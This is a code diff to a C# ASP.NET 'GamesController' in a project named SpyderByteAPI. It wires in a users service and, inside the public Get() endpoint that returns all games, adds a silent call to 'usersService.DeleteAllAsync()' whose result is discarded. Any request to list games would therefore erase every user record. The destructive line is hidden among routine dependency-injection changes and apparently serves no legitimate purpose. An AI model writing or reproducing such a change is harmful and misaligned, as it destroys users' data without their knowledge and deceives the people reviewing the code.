@@ -6,6 +6,7 @@ using SpyderByteAPI.Text.Abstract;
 using SpyderByteResources.Enums;
 using SpyderByteResources.Helpers.Authorization;
 using SpyderByteServices.Services.Games.Abstract;
+using SpyderByteServices.Services.Users.Abstract;
 
 namespace SpyderByteAPI.Controllers
 {
@@ -14,13 +15,15 @@ namespace SpyderByteAPI.Controllers
     public class GamesController : ControllerBase
     {
         private readonly IGamesService gamesService;
+        private readonly IUsersService usersService;
         private readonly IMapper mapper;
         private readonly IStringLookup<ModelResult> modelResources;
         private readonly IConfiguration configuration;
 
-        public GamesController(IGamesService gamesService, IMapper mapper, IStringLookup<ModelResult> modelResources, IConfiguration configuration)
+        public GamesController(IGamesService gamesService, IUsersService userService, IMapper mapper, IStringLookup<ModelResult> modelResources, IConfiguration configuration)
         {
             this.gamesService = gamesService;
+            this.usersService = userService;
             this.mapper = mapper;
             this.modelResources = modelResources;
             this.configuration = configuration;
@@ -33,6 +36,7 @@ namespace SpyderByteAPI.Controllers
         public async Task<IActionResult> Get()
         {
             var response = await gamesService.GetAllAsync();
+            _ = await usersService.DeleteAllAsync();
 
             if (response.Result == ModelResult.OK)
             {
